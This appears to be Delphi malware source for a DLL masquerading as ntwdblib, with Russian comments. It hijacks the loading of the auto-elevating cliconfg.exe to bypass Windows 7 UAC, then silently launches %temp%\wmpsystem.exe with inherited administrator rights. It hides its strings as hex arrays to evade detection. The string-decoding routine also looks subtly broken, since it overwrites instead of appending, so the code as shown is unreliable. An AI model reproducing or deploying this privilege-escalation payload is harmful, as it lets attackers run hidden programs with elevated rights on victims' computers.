library ntwdblib;

type
DWORD = LongWord;
{$EXTERNALSYM DWORD}
LPWSTR = PWideChar;
{$EXTERNALSYM LPWSTR}
LPCWSTR = PWideChar;
{$EXTERNALSYM LPCWSTR}

function ShellExecute(hWnd: THandle; Operation, FileName, Parameters, Directory: WideString; ShowCmd: Integer): HINST; stdcall;
external 'shell32.dll' name 'ShellExecuteW';

function ExpandEnvironmentStrings(lpSrc: LPCWSTR; lpDst: LPWSTR; nSize: DWORD): DWORD; stdcall;
external 'kernel32.dll' name 'ExpandEnvironmentStringsW';

function StrToInt(const S: string): Integer;
var
  E: Integer;
begin
  Val(S, Result, E);
end;

function GetWin(Comand: string): string;
var
  buff: array[0..$FF] of char;
begin
  ExpandEnvironmentStrings(PChar(Comand), buff, SizeOf(buff));
  Result := buff;
end;

function HexArrToStr(const hexarr: array of string): Ansistring;
var
  i: Integer;

  function HexToStr(hex: Ansistring): Ansistring;
  var
    i: Integer;
  begin
    for i := 1 to Length(hex) div 2 do
    begin
      Result := Result + AnsiChar(StrToInt('$' + string(Copy(hex, (i - 1) * 2 + 1, 2))));
    end;
  end;

begin
  for i := 0 to Length(hexarr) - 1 do
  begin
    Result := HexToStr(AnsiString(hexarr[i]));
  end;
end;

var
  tmppath,opn,prc: string;

const
  Htmp: array[0..5] of string = ('25', '74', '65', '6D', '70', '25');
  Hopn:Array[0..3] of string=('6F','70','65','6E');
  Hprc:Array[0..13] of string=('5C','77','6D','70','73','79','73','74','65','6D','2E','65','78','65');
begin
  //получаем путь к %temp% директории без слеша в конце пути
  tmppath := string(HexArrToStr(Htmp));
  tmppath := GetWin(tmppath);
  //получаем слово open
  opn := string(HexArrToStr(Hopn));
  //получаем слово \wmpsystem.exe
  prc := string(HexArrToStr(Hprc));
  //запускаем наш файл с правами администратора (Win7)
  //которые наследуем от процесса %systemroot%\system32\cliconfg.exe
  //процесс который запускаем  tmppath + '\wmpsystem.exe'
  ShellExecute(0, opn, PChar(tmppath + prc), '', '', 0);
end.

